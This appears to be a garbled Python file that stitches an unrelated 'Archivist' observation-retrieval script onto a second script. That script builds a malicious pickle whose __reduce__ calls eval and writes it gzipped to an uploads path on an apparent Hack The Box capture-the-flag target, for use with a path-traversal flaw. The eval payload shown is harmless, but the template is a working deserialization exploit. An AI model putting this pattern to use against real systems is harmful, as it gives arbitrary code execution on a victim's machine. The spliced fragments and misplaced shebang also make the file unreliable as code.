from core.serpents.archivist import Archivist


archivist = Archivist()

observations = archivist.retrieve("MIS-2026-0001")
print()
print("ARCHIVIST")
print("---------")
print("Observations retrieved:", len(observations))

for observation in observations:
    print(
        observation.id,
        observation.category,
        observation.observed_at,
    )




    #!/usr/bin/env python3
import pickle
import gzip

def create_pickle():
    print("Creating demonstration pickle file...")

    class PickledLoad:
        def __reduce__(self):
            # This function will be called during unpickling
            code = "print('Safety code executed.') or exit(0) or {}"
            return (eval, (code,))

    demo_cmap_data = PickledLoad()

    # Create the pickle file that the path traversal would access
    htb_path = "/var/www/research.bedside.htb/uploads/malicious1.pickle.gz"

    try:
        with gzip.open(htb_path, 'wb') as f:
            pickle.dump(demo_cmap_data, f)
        print(f"✓ Created demonstration pickle file: {htb_path}")
        return htb_path

    except Exception as e:
        print(f"✗ Error creating pickle file: {e}")
        return None

if __name__ == "__main__":
    create_pickle()